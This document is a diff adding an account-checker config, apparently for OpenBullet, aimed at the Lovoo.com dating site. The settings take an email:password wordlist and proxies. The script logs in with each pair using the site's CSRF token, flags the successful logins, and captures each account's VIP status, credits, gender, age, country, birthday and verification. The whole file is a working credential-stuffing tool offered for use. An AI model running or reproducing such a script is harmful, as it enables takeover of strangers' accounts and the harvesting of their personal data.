@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "Lovoo.com",
+  "SuggestedBots": 10,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-26T10:20:56.5940868-07:00",
+  "AdditionalInfo": "",
+  "Author": "AT0M77",
+  "Version": "1.4.3 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.lovoo.com/" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+PARSE "<COOKIES(lovoocsrf)>" LR "" "" -> VAR "token" 
+
+#Login REQUEST POST "https://www.lovoo.com/login_check" 
+  CONTENT "_username=<USER>&_password=<PASS>&_remember_me=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.lovoo.com/" 
+  HEADER "APP: lovoo" 
+  HEADER "public: true" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-Csrf-Token: <token>" 
+  HEADER "TE: Trailers" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+
+REQUEST GET "https://www.lovoo.com/settings/account" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+#Vip PARSE "<SOURCE>" LR "\"isVip\":" "," -> CAP "VIP" 
+
+#Gender PARSE "<SOURCE>" LR "\",\"gender\":" "," -> CAP "Gender" 
+
+#Age PARSE "<SOURCE>" LR "\"age\":" "," -> CAP "Age" 
+
+#country PARSE "<SOURCE>" LR "\"country\":\"" "\"" -> CAP "Country" 
+
+#Credits PARSE "<SOURCE>" LR "\"credits\":" "," -> CAP "Credits" 
+
+#DOB PARSE "<SOURCE>" LR "\"birthday\":\"" "\"" -> CAP "DOB" 
+
+#Verified PARSE "<SOURCE>" LR "\"isVerified\":" "," -> CAP "Verified" 
+
